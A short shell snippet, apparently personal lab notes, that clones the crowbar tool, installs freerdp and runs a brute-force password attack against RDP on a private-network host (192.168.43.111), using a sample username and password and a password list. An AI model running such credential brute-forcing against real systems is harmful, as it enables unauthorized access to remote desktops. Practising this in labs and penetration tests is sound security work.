git clone https://github.com/galkan/crowbar
cd crowbar/
# pip3 install -r requirements.txt
# sudo apt-get install freerdp2-x11
# connection client rdp -> server rdp
            # (hacker)      (hacke)
# xfreerdp -u:itu -p:abc -v:192.168.43.111
# crowbar
./crowbar.py -b rdp -s 192.168.43.111/32 -u itu -C crowbar.txt
